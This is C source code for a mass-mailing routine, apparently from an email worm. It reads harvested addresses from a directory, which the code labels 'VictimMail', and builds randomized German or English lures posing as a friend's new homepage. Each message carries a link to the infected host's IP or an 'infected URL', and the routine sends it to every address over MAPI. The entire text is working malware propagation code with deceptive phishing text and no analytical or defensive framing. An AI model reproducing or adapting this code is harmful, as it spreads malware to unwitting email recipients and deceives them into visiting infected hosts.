   bool MassMailUrl(char MailAddressDirectory[])
   {
       char            IPAddress[MAX_PATH];
       char            InfectedUrl[MAX_PATH];
       HINSTANCE       MapiDll;
       LPMAPILOGON     MapiLogon;
       LPMAPILOGOFF    MapiLogoff;
       LHANDLE         MapiSessionHandle;
       HANDLE          FindHandle;
       WIN32_FIND_DATA Win32FindData;
       unsigned int    MailCount = 0;
       char            VictimMail[MAX_PATH];
       char            MailSubject[MAX_PATH];
       char            MailBody[2048];
       char            LangBuffer[4];
       char            *GermanSubjects[] = {
                                            "Schau dir meine erste Homepage an!",
                                            "Ich hab ne Webseite gemacht...",
                                            "Hab ne website gebastelt :)",
                                            "Noch nich viel aber...",
                                            "Hab eine einfache Homepage erstellt"
                                           };
       char            *GermanHellos[] =       {
                                            "Heya,",
                                            "Was geht...",
                                            "Hallo",
                                            "Hi",
                                            "Hey Kumpel!!"
                                           };
       char            *GermanBody1[] =    {
                                            "Ich hab mal ein bisschen gebastelt, und schau was draus geworden ist:",
                                            "Sag mir was du von meiner allerersten Homepage haelst!",
                                            "Ich hab eine Webseite erstellt! Sind zwar nur ein paar Bilder, aber ich arbeite dran ;)",
                                            "Eine Homepage zu machen ist echt fun!",
                                            "Ja Man! Meine persoehnliche Website!!!!!"
                                           };
       char            *GermanBody2[] =    {
                                            "Also, schreib mir was du denkst...",
                                            "Gute page, oder?! Ich arbeite weiter dran...",
                                            "So, ich bastel jetzt noch ne Runde weiter...",
                                            "Gut heh? ;D",
                                            "Du solltest auch ne Homepage machen ;)"
                                           };
       char            *GermanByes[] =     {
                                            "Bis denne..",
                                            "Viel Spass noch mit der Page!",
                                            "Tschau",
                                            "Man sieht sich!",
                                            "Adios Amigos!"
                                           };
       char            *EnglishSubjects[] ={
                                            "Look at my first homepage!",
                                            "I've made a website...",
                                            "I build a website ;)",
                                            "Not much but...",
                                            "I create a simple homepage!!!"
                                           };
       char            *EnglishHellos[] =      {
                                            "Hey,",
                                            "Whassup...",
                                            "Hello",
                                            "Hi",
                                            "Hey Dude!"
                                           };
       char            *EnglishBody1[] =   {
                                            "I played a little bit, and look what i have made:",
                                            "Gimme feedback what you think about my homepage!",
                                            "I've made a homepage! Just some pictures, but i keep on working ;)",
                                            "Creating a homepage is so much fun!",
                                            "Yeah man! My personal website!!!"
                                           };
       char            *EnglishBody2[] =   {
                                            "So, answer what you think...",
                                            "Nice page, or not?! I keep on working...",
                                            "Let's do more stuff for my homepage ;D...",
                                            "Nice heh!?!? ;D",
                                            "You should create a website too ;)"
                                           };
       char            *EnglishByes[] =        {
                                            "Cya..",
                                            "Much fun with my page!",
                                            "Byea...",
                                            "Next time..",
                                            "Have a nice day!!"
                                           };

       if(GetIP(IPAddress) == false) return false;

       MapiDll = LoadLibrary("MAPI32.DLL");

       if(MapiDll != 0)
       {
           MapiLogon       = (LPMAPILOGON)     GetProcAddress(MapiDll, "MAPILogon");
           MapiLogoff      = (LPMAPILOGOFF)    GetProcAddress(MapiDll, "MAPILogoff");

           if(MapiLogon(0, 0, 0, 0, 0, &MapiSessionHandle) == SUCCESS_SUCCESS)
           {
               SetCurrentDirectory(MailAddressDirectory);
               FindHandle = FindFirstFile("*.*", &Win32FindData);

               do
               {
                   if(lstrcmp(Win32FindData.cFileName, ".") == 0 || lstrcmp(Win32FindData.cFileName, "..") == 0) continue;

                   lstrcpy(VictimMail, Win32FindData.cFileName);
                   lstrcpy(LangBuffer, VictimMail + lstrlen(VictimMail) - 3);

                   if(lstrcmp(LangBuffer, ".de") == 0 || lstrcmp(LangBuffer, ".DE") == 0 || lstrcmp(LangBuffer, ".De") == 0)
                   {
                       lstrcpy(MailSubject, GermanSubjects[RandomNumber(5)]);
                       lstrcpy(MailBody, GermanHellos[RandomNumber(5)]);
                       lstrcat(MailBody, "\r\n\r\n\r\n");
                       lstrcat(MailBody, GermanBody1[RandomNumber(5)]);
                       lstrcat(MailBody, "\r\n\r\n");

                       if(AbuseUrl(IPAddress, InfectedUrl) == true) lstrcat(MailBody, InfectedUrl);
                       else lstrcat(MailBody, IPAddress);

                       lstrcat(MailBody, "\r\n\r\n");
                       lstrcat(MailBody, GermanBody2[RandomNumber(5)]);
                       lstrcat(MailBody, "\r\n\r\n\r\n");
                       lstrcat(MailBody, GermanByes[RandomNumber(5)]);
                   }
                   else
                   {
                       lstrcpy(MailSubject, EnglishSubjects[RandomNumber(5)]);
                       lstrcpy(MailBody, EnglishHellos[RandomNumber(5)]);
                       lstrcat(MailBody, "\r\n\r\n\r\n");
                       lstrcat(MailBody, EnglishBody1[RandomNumber(5)]);
                       lstrcat(MailBody, "\r\n\r\n");

                       if(AbuseUrl(IPAddress, InfectedUrl) == true) lstrcat(MailBody, InfectedUrl);
                       else lstrcat(MailBody, IPAddress);

                       lstrcat(MailBody, "\r\n\r\n");
                       lstrcat(MailBody, EnglishBody2[RandomNumber(5)]);
                       lstrcat(MailBody, "\r\n\r\n\r\n");
                       lstrcat(MailBody, EnglishByes[RandomNumber(5)]);
                   }

                   MapiSendMail(MapiSessionHandle, "", VictimMail, MailSubject, MailBody, "", "");

                   MailCount++;
               }
               while(FindNextFile(FindHandle, &Win32FindData) != 0);

               MapiLogoff(MapiSessionHandle, 0, 0, 0);
               FreeLibrary(MapiDll);
               return true;
           }

           FreeLibrary(MapiDll);
       }

       return false;
   }
